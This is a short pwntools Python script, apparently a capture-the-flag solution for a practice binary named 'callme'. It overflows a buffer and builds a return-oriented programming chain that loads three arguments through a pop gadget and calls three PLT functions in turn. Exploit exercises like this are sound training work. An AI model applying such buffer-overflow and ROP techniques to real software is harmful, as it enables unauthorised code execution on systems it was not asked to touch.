from pwn import *

target = process("./callme")

# The three required arguments for each callme_ function call
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
load_args_gadget = 0x40093c # 0x40093c: pop rdi; pop rsi; pop rdx; ret;
load_args = p64(load_args_gadget) + p64(arg1) + p64(arg2) + p64(arg3)

callme_one_plt = 0x400720 # Entry point for callme_one@plt
callme_two_plt = 0x400740 # Entry point for callme_two@plt
callme_three_plt = 0x4006f0 # Entry point for callme_three@plt


payload = b"A"*40
# For each callme_ function call, load the arguments then jump to the PLT entry for that function
payload += load_args + p64(callme_one_plt)
payload += load_args + p64(callme_two_plt)
payload += load_args + p64(callme_three_plt)

target.sendline(payload)
target.interactive()
